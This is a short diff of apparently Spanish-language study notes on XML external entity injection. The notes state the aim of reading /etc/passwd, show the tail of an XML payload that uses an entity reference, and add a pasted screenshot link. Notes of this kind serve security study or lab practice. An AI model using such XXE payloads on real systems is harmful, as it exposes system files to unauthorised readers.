@@ -66,3 +66,5 @@ usaremos esta xml inyeccion para intentar mirar el etc/passwd
 <com>&test; </com> 
 </comment>
 ```
+
+![[Pasted image 20231212001031.png]]
